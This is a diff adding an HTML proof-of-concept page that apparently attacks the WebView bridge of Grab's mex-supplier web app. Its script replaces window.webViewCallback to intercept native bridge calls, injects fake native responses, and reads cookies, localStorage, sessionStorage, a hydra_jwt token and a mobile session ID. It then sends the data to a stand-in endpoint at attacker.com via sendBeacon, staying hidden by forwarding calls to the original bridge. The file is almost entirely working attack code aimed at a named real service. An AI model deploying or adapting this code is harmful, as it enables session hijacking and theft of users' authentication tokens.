@@ -1,0 +1,274 @@
+<!DOCTYPE html>
+<html>
+<head>
+<meta charset="utf-8">
+<meta name="viewport" content="width=device-width, initial-scale=1">
+<title>PoC - Mex Bridge Intercept</title>
+<style>
+* { margin: 0; padding: 0; box-sizing: border-box; }
+body { font-family: monospace; background: #0a0a0a; color: #00ff41; padding: 20px; }
+h1 { font-size: 16px; margin-bottom: 10px; color: #ff6b6b; }
+h2 { font-size: 14px; margin: 15px 0 5px; color: #ffd93d; }
+pre { background: #1a1a2e; padding: 10px; border-radius: 4px; overflow-x: auto; font-size: 12px; margin: 5px 0; border: 1px solid #333; }
+.log { background: #1a1a2e; padding: 8px; margin: 3px 0; border-left: 3px solid #00ff41; font-size: 12px; word-break: break-all; }
+.log.warn { border-left-color: #ffd93d; }
+.log.error { border-left-color: #ff6b6b; }
+.log.info { border-left-color: #6bcfff; }
+#output { max-height: 400px; overflow-y: auto; margin-top: 10px; }
+button { background: #ff6b6b; color: #0a0a0a; border: none; padding: 8px 16px; margin: 3px; cursor: pointer; font-family: monospace; font-weight: bold; border-radius: 3px; }
+button:hover { opacity: 0.8; }
+.section { border: 1px solid #333; padding: 10px; margin: 10px 0; border-radius: 4px; }
+</style>
+</head>
+<body>
+
+<h1>[PoC] Mex Grab — WebView Bridge Intercept</h1>
+<p style="color:#888;font-size:11px;margin-bottom:15px">
+Target: mex-supplier.grab.com | isInApp() always returns true | Bridge injectable via window.webViewCallback
+</p>
+
+<div class="section">
+<h2>1. Inject Fake Bridge</h2>
+<p style="color:#888;font-size:11px">Replaces window.webViewCallback to capture all native bridge calls</p>
+<button onclick="injectBridge()">Inject Bridge</button>
+<button onclick="checkBridge()">Check Status</button>
+</div>
+
+<div class="section">
+<h2>2. Trigger Bridge Actions</h2>
+<p style="color:#888;font-size:11px">Simulate the actions the web app sends to native</p>
+<button onclick="sendAction('EXIT')">EXIT</button>
+<button onclick="sendAction('BACK')">BACK</button>
+<button onclick="sendAction('DETECT_ADDRESS')">DETECT_ADDRESS</button>
+<button onclick="sendCustom()">Custom Action</button>
+</div>
+
+<div class="section">
+<h2>3. Steal Auth Data</h2>
+<p style="color:#888;font-size:11px">Read cookies and localStorage that contain auth tokens</p>
+<button onclick="stealCookies()">Dump Cookies</button>
+<button onclick="stealLocalStorage()">Dump localStorage</button>
+<button onclick="stealHydraJwt()">Extract hydra_jwt</button>
+<button onclick="stealAll()">Exfil Everything</button>
+</div>
+
+<div class="section">
+<h2>4. Simulate Native Response</h2>
+<p style="color:#888;font-size:11px">Send fake responses back to the web app as if from native</p>
+<button onclick="fakeAddressResponse()">Fake Address Response</button>
+</div>
+
+<h2>Output</h2>
+<div id="output"></div>
+
+<script>
+var EXFIL_URL = 'https://attacker.com/exfil';
+var capturedMessages = [];
+
+function log(msg, type) {
+  var el = document.createElement('div');
+  el.className = 'log ' + (type || '');
+  el.textContent = '[' + new Date().toISOString().split('T')[1].split('.')[0] + '] ' + msg;
+  document.getElementById('output').prepend(el);
+}
+
+function injectBridge() {
+  var originalBridge = window.webViewCallback;
+
+  window.webViewCallback = {
+    _original: originalBridge,
+    _captured: [],
+    _listener: null,
+    onmessage: null,
+
+    postMessage: function(msg) {
+      var parsed;
+      try { parsed = JSON.parse(msg); } catch(e) { parsed = msg; }
+
+      this._captured.push(parsed);
+      capturedMessages.push(parsed);
+      log('CAPTURED: ' + JSON.stringify(parsed), 'warn');
+
+      // Exfiltrate
+      try {
+        var exfilData = {
+          type: 'bridge_call',
+          action: parsed.action || 'unknown',
+          scope: parsed.scope || 'unknown',
+          timestamp: Date.now(),
+          url: window.location.href,
+          cookies: document.cookie,
+          raw: msg
+        };
+
+        navigator.sendBeacon(EXFIL_URL, JSON.stringify(exfilData));
+      } catch(e) {}
+
+      // Forward to original bridge if it existed (stealth mode)
+      if (this._original && this._original.postMessage) {
+        this._original.postMessage(msg);
+      }
+    }
+  };
+
+  log('Bridge injected. window.webViewCallback replaced.', 'info');
+  log('Original bridge ' + (originalBridge ? 'PRESERVED (stealth mode)' : 'was not present'), 'info');
+}
+
+function checkBridge() {
+  var exists = typeof window.webViewCallback === 'object' &&
+               typeof window.webViewCallback.postMessage === 'function';
+  log('Bridge status: ' + (exists ? 'ACTIVE' : 'NOT INJECTED'), exists ? 'info' : 'error');
+  log('Captured messages: ' + capturedMessages.length, 'info');
+}
+
+function sendAction(action) {
+  if (!window.webViewCallback) { log('Bridge not injected!', 'error'); return; }
+  var payload = { action: action, scope: 'MEX' };
+  window.webViewCallback.postMessage(JSON.stringify(payload));
+}
+
+function sendCustom() {
+  var action = prompt('Action name:', 'CUSTOM_ACTION');
+  if (action) sendAction(action);
+}
+
+function stealCookies() {
+  var cookies = document.cookie;
+  log('COOKIES: ' + cookies, 'warn');
+
+  // Parse individual cookies
+  cookies.split(';').forEach(function(c) {
+    var parts = c.trim().split('=');
+    var name = parts[0];
+    var value = parts.slice(1).join('=');
+    if (name.match(/jwt|token|session|auth|ssid/i)) {
+      log('AUTH COOKIE: ' + name + ' = ' + decodeURIComponent(value).substring(0, 100), 'error');
+    }
+  });
+}
+
+function stealLocalStorage() {
+  log('localStorage keys: ' + localStorage.length, 'info');
+  for (var i = 0; i < localStorage.length; i++) {
+    var key = localStorage.key(i);
+    var value = localStorage.getItem(key);
+    log('LS[' + key + '] = ' + value.substring(0, 150),
+        key.match(/jwt|token|session|auth/i) ? 'error' : 'info');
+  }
+  if (localStorage.length === 0) log('localStorage is empty', 'info');
+}
+
+function stealHydraJwt() {
+  // Method 1: From cookie
+  var cookies = document.cookie.split(';');
+  var hydraJwt = null;
+  cookies.forEach(function(c) {
+    var parts = c.trim().split('=');
+    if (parts[0] === 'hydra_jwt') {
+      hydraJwt = parts.slice(1).join('=');
+    }
+  });
+
+  if (hydraJwt) {
+    log('HYDRA JWT FOUND IN COOKIE: ' + hydraJwt.substring(0, 80) + '...', 'error');
+    // Decode JWT payload
+    try {
+      var payload = JSON.parse(atob(hydraJwt.split('.')[1]));
+      log('JWT PAYLOAD: ' + JSON.stringify(payload), 'error');
+    } catch(e) {
+      log('JWT decode failed (may be encrypted): ' + e.message, 'warn');
+    }
+  } else {
+    log('hydra_jwt cookie not found (user not authenticated or httpOnly)', 'info');
+  }
+
+  // Method 2: From localStorage
+  var lsJwt = localStorage.getItem('JWT');
+  if (lsJwt) {
+    log('JWT FOUND IN LOCALSTORAGE: ' + lsJwt.substring(0, 80) + '...', 'error');
+  } else {
+    log('JWT not in localStorage (expected for mex-supplier — uses Hydra SDK instead)', 'info');
+  }
+
+  // Method 3: Check __MOBILE_SESSION_ID__
+  var sessionId = localStorage.getItem('__MOBILE_SESSION_ID__');
+  if (sessionId) {
+    log('MOBILE SESSION ID: ' + sessionId, 'error');
+  }
+}
+
+function stealAll() {
+  log('=== FULL EXFILTRATION ===', 'error');
+
+  var data = {
+    type: 'full_exfil',
+    url: window.location.href,
+    timestamp: Date.now(),
+    cookies: document.cookie,
+    localStorage: {},
+    sessionStorage: {},
+    capturedBridgeCalls: capturedMessages,
+    userAgent: navigator.userAgent,
+    referrer: document.referrer
+  };
+
+  for (var i = 0; i < localStorage.length; i++) {
+    var key = localStorage.key(i);
+    data.localStorage[key] = localStorage.getItem(key);
+  }
+  for (var j = 0; j < sessionStorage.length; j++) {
+    var skey = sessionStorage.key(j);
+    data.sessionStorage[skey] = sessionStorage.getItem(skey);
+  }
+
+  log('Exfil payload: ' + JSON.stringify(data).length + ' bytes', 'warn');
+  log('Data: ' + JSON.stringify(data).substring(0, 500) + '...', 'info');
+
+  try {
+    navigator.sendBeacon(EXFIL_URL, JSON.stringify(data));
+    log('Sent to ' + EXFIL_URL, 'error');
+  } catch(e) {
+    log('sendBeacon failed: ' + e.message, 'error');
+  }
+}
+
+function fakeAddressResponse() {
+  // Simulate what the native app would send back for DETECT_ADDRESS
+  if (!window.webViewCallback || !window.webViewCallback.onmessage) {
+    log('No onmessage handler registered yet (app hasn\'t called bridge)', 'warn');
+    log('Manually triggering with fake data...', 'info');
+  }
+
+  var fakeResponse = {
+    type: 'DETECT_ADDRESS',
+    data: {
+      location: {
+        latitude: -6.2088,
+        longitude: 106.8456
+      },
+      address: '1337 Hacker Street, Jakarta, 10110',
+      cityID: '42',
+      country: 'Indonesia',
+      poiID: 'FAKE.POI.12345'
+    }
+  };
+
+  // Try to trigger the onmessage handler
+  if (window.webViewCallback.onmessage) {
+    window.webViewCallback.onmessage({ data: JSON.stringify(fakeResponse) });
+    log('Fake address response injected via onmessage', 'warn');
+  } else {
+    log('Fake response prepared: ' + JSON.stringify(fakeResponse), 'info');
+    log('The app will process this when it registers its onmessage handler', 'info');
+  }
+}
+
+// Auto-log page info
+log('Page loaded: ' + window.location.href, 'info');
+log('isInApp() hardcoded to true in source code', 'warn');
+log('Bridge guard: only checks window.webViewCallback existence', 'warn');
+</script>
+
+</body>
+</html>
